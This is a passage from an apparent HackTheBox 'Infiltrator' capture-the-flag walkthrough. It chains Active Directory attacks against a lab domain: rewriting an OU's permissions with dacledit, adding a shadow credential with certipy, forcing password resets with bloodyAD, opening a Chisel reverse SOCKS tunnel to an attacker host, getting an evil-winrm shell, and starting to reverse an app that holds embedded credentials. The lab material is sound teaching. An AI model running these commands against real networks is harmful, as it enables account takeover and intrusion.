D.Anderson has `GenericAll` on the Marketing Digital organization unit (OU). An OU is a way to group and manage users (and computers and other objects) within active directory. It allows for admins to say that all users in this specific area should have these rights.

[DACL Trouble: GenericAll on OUs](https://www.adamcouch.co.uk/dacl-trouble-genericall-on-ous/) from Adam Couch goes into how a penetration tester can abuse this privilege on an OU. The idea is to configure the OU such that all members of the OU get the `GenericAll` permission from a user that I control. Once I have `GenericAll` over a user, I can change their password or add a shadow credential.

The [BloodHound Support](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll#h_01HM28BQ0587GFX2DM54GCQZ2M) documentation has a similar bit about abusing `GenericAll` on an OU.

#### HTB Note

This entire path has a reset so that other players don’t get the benefit. I have to do all these commands very quickly in order to get it to work. I’ll walk through them with explanation, but the best way to manage it is with a pasteable script that runs all the commands together.

#### Modify OU

Both of the posts above show how to use PowerShell to change the OU discretionary access control list (DACL). I don’t have PowerShell access to Infiltrator yet. [This post from SynActiv](https://www.synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) shows how to do it with `dacledit.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)):

![image-20240906092735187](/img/image-20240906092735187.png)

This is exactly what I want to do. If I try using password, it fails:

```

oxdf@hacky$ dacledit.py -action write -rights FullControl -inheritance -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip infiltrator.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] unsupported hash type MD4

```

That’s due to the limitations on the D.Anderson account. I’ll get a ticket with Kerberos:

```

oxdf@hacky$ getTGT.py 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip infiltrator.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in d.anderson.ccache

```

How I’ll run `dacledit.py` with `-k and -no-pass` with that ticket set as the `KRB5CCNAME`:

```

oxdf@hacky$ KRB5CCNAME=d.anderson.ccache dacledit.py -action write -rights FullControl -inheritance -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" infiltrator.htb/d.anderson -k -no-pass -dc-ip infiltrator.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240906-094213.bak
[*] DACL modified successfully!

```

Alternatively, I can just add `-k` to the original command, and it will handle this in the background:

```

oxdf@hacky$ dacledit.py -action write -rights FullControl -inheritance -principal d.anderson -target-dn "OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB" 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip infiltrator.htb -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250610-212946.bak
[*] DACL modified successfully!

```

Either way, now D.Anderson has `FullControl` over all the members of the OU, including E.Rodriguez.

#### Shadow Credential

With `FullControl`, a lot of people would go to changing the password of e.rodriguez. I would much rather add a shadow credential to the account using [Certipy](https://github.com/ly4k/Certipy?tab=readme-ov-file#shadow-credentials) like I showed in [Absolute](/2023/05/27/htb-absolute.html#shadow-credential). This attack is not only stealthier, but also isn’t suceptable to HTB cleanup scripts.

```

oxdf@hacky$ KRB5CCNAME=d.anderson.ccache certipy shadow auto -k -target dc01.infiltrator.htb -account e.rodriguez
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'E.rodriguez'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4'
[*] Adding Key Credential with device ID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4' to the Key Credentials for 'E.rodriguez'
[*] Successfully added Key Credential with device ID '030e3bf6-55fc-8c91-3f30-b52c9b22c7f4' to the Key Credentials for 'E.rodriguez'
[*] Authenticating as 'E.rodriguez' with the certificate
[*] Using principal: e.rodriguez@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'e.rodriguez.ccache'
[*] Trying to retrieve NT hash for 'e.rodriguez'
[*] Restoring the old Key Credentials for 'E.rodriguez'
[*] Successfully restored the old Key Credentials for 'E.rodriguez'
[*] NT hash for 'E.rodriguez': b02e97f2fdb5c3d36f77375383449e56

```

This both leaks the NTLM for the account and saves a new TGT as `e.rodriguez.ccache`. I’ll use the ticket to authenticate with `netexec`, and it works!

```

oxdf@hacky$ KRB5CCNAME=e.rodriguez.ccache netexec smb infiltrator.htb --use-kcache
SMB         infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         infiltrator.htb 445    DC01             [+] infiltrator.htb\e.rodriguez from ccache

```

The NTLM hash also leaks, and it works to auth as well:

```

oxdf@hacky$ netexec smb dc01.infiltrator.htb -u E.rodriguez -H b02e97f2fdb5c3d36f77375383449e56
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\E.rodriguez:b02e97f2fdb5c3d36f77375383449e56 

```

I can use either the ticket or the NTLM hash to auth as E.rodriguez for the next steps.

### Auth as M.Harris

#### Add E.Rodriguez to CHIEFS MARKETING Group

I’ll use [BloodyAD](https://github.com/CravateRouge/bloodyAD) to add E.Rodriguez to the Chiefs Marketing group, as they have `AddSelf` on the group:

```

oxdf@hacky$ bloodyAD -u e.rodriguez -p :b02e97f2fdb5c3d36f77375383449e56 --host dc01.infiltrator.htb -d infiltrator.htb add groupMember "CHIEFS MARKETING" e.rodriguez 
[+] e.rodriguez added to CHIEFS MARKETING

```

That same command over Kerberos auth looks like:

```

oxdf@hacky$ KRB5CCNAME=e.rodriguez.ccache bloodyAD -u e.rodriguez -k --host dc01.infiltrator.htb -d infiltrator.htb add groupMember "CHIEFS MARKETING" e.rodriguez
[+] e.rodriguez added to CHIEFS MARKETING

```

#### Change M.Harris’ Password

Members of the Chiefs Marketing group have `ForceChangePassword` over M.Harris. As E.Rodriguez is now a member of that group, I’ll change this with `bloodyAD`:

```

oxdf@hacky$ bloodyAD -u e.rodriguez -p :b02e97f2fdb5c3d36f77375383449e56 --host dc01.infiltrator.htb -d infiltrator.htb set password m.harris "0xdf0xdf!"
[+] Password changed successfully!

```

The creds for M.Harris have the same restrictions as D.Anderson:

```

oxdf@hacky$ netexec smb infiltrator.htb -u m.harris -p '0xdf0xdf!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\m.harris:0xdf0xdf! STATUS_ACCOUNT_RESTRICTION 
oxdf@hacky$ netexec winrm infiltrator.htb -u m.harris -p '0xdf0xdf!'
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [-] infiltrator.htb\m.harris:0xdf0xdf!

```

Originally I used `changepasswd.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)). I believe this worked back when Infiltrator released, but today it gives:

```

oxdf@hacky$ changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb -althash :b02e97f2fdb5c3d36f77375383449e56 -reset -dc-ip dc01.infiltrator.htb -newpass '0xdf0xdf!' -altuser e.rodriguez
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of infiltrator.htb\m.harris as infiltrator.htb\e.rodriguez
[*] Connecting to DCE/RPC as infiltrator.htb\e.rodriguez
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

```

The password changes, but there’s a warning at the end that the AES keys for Kerberos are not correct. Using Kerberos will fail with `KDC_ERR_ETYPE_NOSUPP`:

```

oxdf@hacky$ netexec smb infiltrator.htb -u m.harris -p '0xdf0xdf!' -k
SMB         infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         infiltrator.htb 445    DC01             [-] infiltrator.htb\m.harris:0xdf0xdf! KDC_ERR_ETYPE_NOSUPP

```

Trying to get a ticket will fail with the same error:

```

oxdf@hacky$ getTGT.py 'infiltrator.htb/m.harris:0xdf0xdf!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)

```

Any tool that uses Impacket is likely to have this same issue.

Using `-p ldap` will change the password *and* the AES key, which avoids these issues:

```

oxdf@hacky$ changepasswd.py infiltrator.htb/m.harris@dc01.infiltrator.htb -althash :b02e97f2fdb5c3d36f77375383449e56 -reset -dc-ip dc01.infiltrator.htb -newpass '0xdf0xdf!' -altuser e.rodriguez -p ldap
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of infiltrator.htb\m.harris as infiltrator.htb\e.rodriguez
[*] Password was changed successfully for CN=M.harris,CN=Users,DC=infiltrator,DC=htb

```

### Shell

I’ll need to use Kerberos. I’ll get a TGT:

```

oxdf@hacky$ getTGT.py 'infiltrator.htb/m.harris:0xdf0xdf!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.harris.ccache

```

I’ll need to update my `/etc/krb5.conf`, having `netexec` generate one for me with `netexec smb infiltrator.htb --generate-krb5-file infiltrator-krb5.conf`:

```

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = INFILTRATOR.HTB

[realms]
    INFILTRATOR.HTB = {
        kdc = dc01.infiltrator.htb
        admin_server = dc01.infiltrator.htb
        default_domain = infiltrator.htb
    }

[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB

```

Now I can `evil-winrm`:

```

oxdf@hacky$ KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\M.harris\Documents>

```

And grab the user flag:

```
*Evil-WinRM* PS C:\Users\M.harris\desktop> type user.txt
d41d8cd9************************

```

## Shell as winrm\_svc

### Enumeration

#### Users

There’s basically nothing in M.Harris’ home directory. There are a couple other home directories on the box:

```
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/20/2024   3:06 AM                Administrator
d-----         8/2/2024   4:51 PM                M.harris
d-----        2/19/2024   5:45 PM                O.martinez
d-r---        12/4/2023   9:22 AM                Public
d-----        2/25/2024   7:25 AM                winrm_svc

```

M.harris doesn’t have any interesting permissions:

```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

#### Programs

In `C:\Program Files` there’s a couple interesting programs:

```
*Evil-WinRM* PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/4/2023   9:22 AM                Common Files
d-----        8/21/2024   1:50 PM                Hyper-V
d-----        2/19/2024   3:52 AM                internet explorer
d-----        2/23/2024   5:06 AM                Output Messenger
d-----         9/6/2024  12:19 PM                Output Messenger Server
d-----       12/12/2023  10:04 AM                PackageManagement
d-----        2/19/2024   4:16 AM                Update Services
d-----        12/4/2023   9:23 AM                VMware
d-r---        11/5/2022  12:03 PM                Windows Defender
d-----        8/21/2024   1:50 PM                Windows Defender Advanced Threat Protection
d-----        11/5/2022  12:03 PM                Windows Mail
d-----        8/21/2024   1:50 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----       12/12/2023  10:04 AM                WindowsPowerShell

```

[Output Messenger](https://www.outputmessenger.com/) certainly jumps out as unusual. I can get into the client, but there’s nothing interesting. M.Harris is not able to access the server files.

#### Network

Looking at listening ports, there’s a stretch in the 14181-14130 that weren’t found by `nmap`:

```
*Evil-WinRM* PS C:\> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       240
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2640
  TCP    0.0.0.0:14118          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14119          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14121          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14122          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14123          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14125          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14126          0.0.0.0:0              LISTENING       3376
  TCP    0.0.0.0:14127          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14128          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14130          0.0.0.0:0              LISTENING       7240
  TCP    0.0.0.0:14406          0.0.0.0:0              LISTENING       3868
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1676
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2184
  TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49707          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49721          0.0.0.0:0              LISTENING       2116
  TCP    0.0.0.0:49747          0.0.0.0:0              LISTENING       2092
  TCP    0.0.0.0:49841          0.0.0.0:0              LISTENING       2772
  TCP    10.10.11.31:53         0.0.0.0:0              LISTENING       2116
  TCP    10.10.11.31:139        0.0.0.0:0              LISTENING       4
...[snip]...
  TCP    10.10.11.31:15220      0.0.0.0:0              LISTENING       7008
  TCP    10.10.11.31:15230      0.0.0.0:0              LISTENING       7352
...[snip]...  
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2116
...[snip]...  
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       636
  TCP    [::]:135               [::]:0                 LISTENING       896
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       636
  TCP    [::]:593               [::]:0                 LISTENING       896
  TCP    [::]:3389              [::]:0                 LISTENING       240
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2640
  TCP    [::]:14118             [::]:0                 LISTENING       7240
  TCP    [::]:14122             [::]:0                 LISTENING       7240
  TCP    [::]:14123             [::]:0                 LISTENING       4
  TCP    [::]:14125             [::]:0                 LISTENING       4
  TCP    [::]:14126             [::]:0                 LISTENING       3376
  TCP    [::]:14127             [::]:0                 LISTENING       7240
  TCP    [::]:14128             [::]:0                 LISTENING       7240
  TCP    [::]:14130             [::]:0                 LISTENING       7240
  TCP    [::]:14406             [::]:0                 LISTENING       3868
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       476
  TCP    [::]:49665             [::]:0                 LISTENING       1224
  TCP    [::]:49666             [::]:0                 LISTENING       1676
  TCP    [::]:49667             [::]:0                 LISTENING       636
  TCP    [::]:49669             [::]:0                 LISTENING       2184
  TCP    [::]:49690             [::]:0                 LISTENING       636
  TCP    [::]:49691             [::]:0                 LISTENING       636
  TCP    [::]:49694             [::]:0                 LISTENING       636
  TCP    [::]:49707             [::]:0                 LISTENING       616
  TCP    [::]:49721             [::]:0                 LISTENING       2116
  TCP    [::]:49747             [::]:0                 LISTENING       2092
  TCP    [::]:49841             [::]:0                 LISTENING       2772
  TCP    [::1]:53               [::]:0                 LISTENING       2116
...[snip]...  
  TCP    [::1]:51420            [::1]:49667            TIME_WAIT       0
  TCP    [::1]:51428            [::1]:9389             TIME_WAIT       0
...[snip]...

```

I’ll use [this block](https://superuser.com/a/1049891) to print listening ports with their process name:

```
*Evil-WinRM* PS C:\> $nets = netstat -ano | select-string LISTENING
‍foreach($n in $nets){
‍    # make split easier PLUS make it a string instead of a match object:
‍    $p = $n -replace ' +',' '
‍    # make it an array:
‍    $nar = $p.Split(' ')
‍    # pick last item:
‍    $pname = $(Get-Process -id $nar[-1]).ProcessName
‍    $ppath = $(Get-Process -id $nar[-1]).Path
‍    # print the modified line with processname instead of PID:
‍    $n -replace "$($nar[-1])","$($ppath) $($pname)"
‍}
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0: System System5            0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0: lsass            0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING        Microsoft.ActiveDirectory.WebServices
  TCP    0.0.0.0:14118          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14119          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14121          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14122          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:1 System123          0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:1 System125          0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:14126          0.0.0.0:0              LISTENING        outputmessenger_httpd
  TCP    0.0.0.0:14127          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14128          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14130          0.0.0.0:0              LISTENING        OMServerService
  TCP    0.0.0.0:14406          0.0.0.0:0              LISTENING        outputmessenger_mysqld
  TCP    0.0.0.0:15223          0.0.0.0:0              LISTENING        OutputMessenger
  TCP    0.0.0.0: System7001          0.0.0.0:0              LISTENING        System
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING        wininit
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING        svchost
  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING        lsass
  TCP    0.0.0.0:49701          0.0.0.0:0              LISTENING        services
  TCP    0.0.0.0:49714          0.0.0.0:0              LISTENING        dns
  TCP    0.0.0.0:49739          0.0.0.0:0              LISTENING        certsrv
  TCP    0.0.0.0:49892          0.0.0.0:0              LISTENING        dfsrs
  TCP    10.10.11.31:53         0.0.0.0:0              LISTENING        dns
  TCP    10.10.11.31:139        0.0.0.0:0              LISTENING        System
  TCP    10.10.11.31:15220      0.0.0.0:0              LISTENING        OutputMessenger
  TCP    10.10.11.31:15230      0.0.0.0:0              LISTENING        OutputMessenger
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING        dns
  TCP    [::]:80                [::]:0                 LISTENING        System
  TCP    [::]:88                [::]:0                 LISTENING        lsass
  TCP    [::]:135               [::]:0                 LISTENING        svchost
  TCP    [::]: System System5               [::]:0                 LISTENING        System
  TCP    [::]:464               [::]:0                 LISTENING        lsass
  TCP    [::]:593               [::]:0                 LISTENING        svchost
  TCP    [::]:3389              [::]:0                 LISTENING        svchost
  TCP    [::]:5985              [::]:0                 LISTENING        System
  TCP    [::]:9389              [::]:0                 LISTENING        Microsoft.ActiveDirectory.WebServices
  TCP    [::]:14118             [::]:0                 LISTENING        OMServerService
  TCP    [::]:14122             [::]:0                 LISTENING        OMServerService
  TCP    [::]:1 System123             [::]:0                 LISTENING        System
  TCP    [::]:1 System125             [::]:0                 LISTENING        System
  TCP    [::]:14126             [::]:0                 LISTENING        outputmessenger_httpd
  TCP    [::]:14127             [::]:0                 LISTENING        OMServerService
  TCP    [::]:14128             [::]:0                 LISTENING        OMServerService
  TCP    [::]:14130             [::]:0                 LISTENING        OMServerService
  TCP    [::]:14406             [::]:0                 LISTENING        outputmessenger_mysqld
  TCP    [::]:15223             [::]:0                 LISTENING        OutputMessenger
  TCP    [::]: System7001             [::]:0                 LISTENING        System
  TCP    [::]:49664             [::]:0                 LISTENING        wininit
  TCP    [::]:49665             [::]:0                 LISTENING        svchost
  TCP    [::]:49666             [::]:0                 LISTENING        svchost
  TCP    [::]:49667             [::]:0                 LISTENING        lsass
  TCP    [::]:49669             [::]:0                 LISTENING        svchost
  TCP    [::]:49682             [::]:0                 LISTENING        lsass
  TCP    [::]:49683             [::]:0                 LISTENING        lsass
  TCP    [::]:49686             [::]:0                 LISTENING        lsass
  TCP    [::]:49701             [::]:0                 LISTENING        services
  TCP    [::]:49714             [::]:0                 LISTENING        dns
  TCP    [::]:49739             [::]:0                 LISTENING        certsrv
  TCP    [::]:49892             [::]:0                 LISTENING        dfsrs
  TCP    [::1]:53               [::]:0                 LISTENING        dns

```

There’s a bunch of ports listening from `OMServerService`, as well as `outputmessenger_httpd`, `outputmessenger_mysqld`, and `OutputMessenger`. The [Output Messenger docs](https://support.outputmessenger.com/connect-to-server-from-internet/) show that the server runs on ports 14121-14124. [This page](https://support.outputmessenger.com/server-install-faq/) says:

> The Ports need to be opened in the Firewall are from 14121 to 14124
>
> **14121 TCP – Application**
>
> **14122 TCP – File Transfer**
>
> **14123 TCP – Web server for Browser Version**
>
> **14124 TCP & UDP – VoIP for Voice/Video/Desktop Sharing**
>
> 14127 to 14129 ports are used internally. (No need to add in Firewall)

#### Tunnel

I’ll upload the latest [Chisel](https://github.com/jpillora/chisel) release for Windows and start the server on my side, connecting to it creating a SOCKS proxy:

```
*Evil-WinRM* PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:1080:socks
c.exe : 2024/09/06 13:30:16 client: Connecting to ws://10.10.14.6:8000
2024/09/06 13:30:16 client: Connected (Latency 16.1869ms)

```

Now I can access the various pages through the tunnel with FoxyProxy set up as:

![image-20240906163921244](/img/image-20240906163921244.png)

Scanning through the open ports, 14123, 14125, and 14126 respond to HTTP.

#### Output Messenger - TCP 14123

Visiting `/` redirects to `/ombro/index.html`, which is an instance of Output Messenger:

![image-20240906164221860](/img/image-20240906164221860.png)

The logo at the top left matches the pages for the site.

#### API - TCP 14125

There’s some kind of API on 14125:

![image-20240906164333318](/img/image-20240906164333318.png)

#### Unknown Site - TCP 14126

This page returns a directory listing:

![image-20240906164614033](/img/image-20240906164614033.png)

The `output` directory returns a 404 page:

![image-20240906164635878](/img/image-20240906164635878.png)

### Get UserExplorer.exe

#### Output Messenger as K.Turner

The user enumeration [above](/2025/06/14/htb-infiltrator.html#user-enumeration) showed the password “MessengerApp@Pass!” for K.Turner, which works here to log in:

![image-20240906165159425](/img/image-20240906165159425.png)

The General\_Chat room has a single message from the admin:

![image-20240906165852671](/img/image-20240906165852671.png)

The Dev\_Chat room has a bunch of chat about LDAP and programming to use it in their app. It does mention “our Output Wall”:

![image-20240906170018586](/img/image-20240906170018586.png)

There’s also a message from admin asking for the final copy of the app:

![image-20240906170444500](/img/image-20240906170444500.png)

#### Output Wall

Researching [Output Wall](https://support.outputmessenger.com/output-wall-integration/), it’s a plugin to the chat application designed for interoffice communication. I’ll download the Output messenger application from [here](https://www.outputmessenger.com/lan-messenger-downloads/) and install it on my Linux VM.

I’ll start it with `proxychains outputmessenger`, and it offers a login screen I’ll enter K.Turner and their creds, with the server as `127.0.0.1` (using proxychains to get to Infiltrator):

![image-20240906180627086](/img/image-20240906180627086.png)

On entering K.Turner’s creds, it shows a similar interface with additional options:

![image-20240906173821757](/img/image-20240906173821757.png)

The chat is nicer looking:

![image-20240906173846037](/img/image-20240906173846037.png)
*Proxychains note:* It was very common to have issue running the Linux application over `proxychains`. I discovered during solving that `proxychains3` worked great, but if I had upgraded to `proxychains4`, it would just show a white box. Running `proxychains3 outputmessenger` works great for me, even after installing version 4. An alternative is to set up Chisel to forward all the necessary ports (which I think based on my `proxychains` output are 14121, 14125, are 14126, but doing 14121-14130 to be safe wouldn’t hurt).

The bottom option on the menu bar to the top left is the Wall:

![image-20240906174029857](/img/image-20240906174029857.png)

The wall has messages on it:

![image-20240906174757554](/img/image-20240906174757554.png)

The post from K.Turner has M.Harris’ password on it:

![image-20240906174827981](/img/image-20240906174827981.png)

That password works for M.Harris:

```

oxdf@hacky$ netexec smb infiltrator.htb -u m.harris -p 'D3v3l0p3r_Pass@1337!' -k
SMB         infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         infiltrator.htb 445    DC01             [+] infiltrator.htb\m.harris:D3v3l0p3r_Pass@1337!

```

#### Output Messenger as M.Harris

Those creds also work to log into Output Messenger as M.Harris. They have a chat with Admin

![image-20240906180953052](/img/image-20240906180953052.png)

Clicking download, the file shows up on my host as `~/Output\ Messenger/FBBB/Received\ Files/Feb\ 2024/UserExplorer.exe`.

### UserExplorer.exe

#### File Overview

The file is a Windows .NET 32-bit executable:

```

oxdf@hacky$ file UserExplorer.exe 
UserExplorer.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

```

On a Windows VM, running it offers a help menu:

```

PS Z:\hackthebox\infiltrator-10.10.11.31 > .\UserExplorer.exe
Usage: UserExplorer.exe -u <username> -p <password>  -s <searchedUsername> [-default]
To use the default credentials: UserExplorer.exe -default -s userToSearch

```

Running it fails to connect to a server (which makes sense as my Windows VM isn’t connected to the HTB VPN at this time):

```

PS Z:\hackthebox\infiltrator-10.10.11.31 > .\UserExplorer.exe -u harris -p test -s test
Attempting Service Connection...
Service Connection Successful.
Search for test user...
An error occurred: The server is not operational.

PS Z:\hackthebox\infiltrator-10.10.11.31 > .\UserExplorer.exe -s test -default
Attempting Service Connection...
Service Connection Successful.
Search for test user...

```

#### Reversing Main

I’ll open the file in DotPeek. It has two classes:

![image-20240906183422295](/img/image-20240906183422295.png)

The `LdapApp.Main` function is relatively simple. It starts by defining some variables:

```

internal class LdapApp
{
  private static void Main(string[] args)
  {
    string path = "LDAP://dc01.infiltrator.htb";
    string username = "";
    string password = "";
    string str1 = "";
    string str2 = "winrm_svc";
    string cipherText = "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=";

```

Then there’s a loop that processes the args:

```

    for (int index = 0; index < args.Length; index += 2)
    {
      switch (args[index].ToLower())
      {
        case "-u":
          username = args[index + 1];
          break;
        case "-p":
          password = args[index + 1];
          break;
        case "-s":
          str1 = args[index + 1];
          break;
        case "-default":
          username = str2;
          password = Decryptor.DecryptString("b14ca5898a4e4133bbce2ea2315a1916", cipherText);
          break;
        default:
          Console.WriteLine(string.Format("Invalid argument: {0}", (object) args[index]));
          return;
      }
    }

```

If the `-default` option is given, it uses the user winrm\_svc with a password that’s decrypted from some base64-encoded data and the `cipherText`.

The rest of the code connects using a C# library to LDAP, queries information, and prints it:

```

    if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
    {
      if (!string.IsNullOrEmpty(str1))
      {
        try
        {
          Console.WriteLine("Attempting Service Connection...");
          using (DirectoryEntry searchRoot = new DirectoryEntry(path, username, password))
          {
            Console.WriteLine("Service Connection Successful.");
            using (DirectorySearcher directorySearcher = new DirectorySearcher(searchRoot))
            {
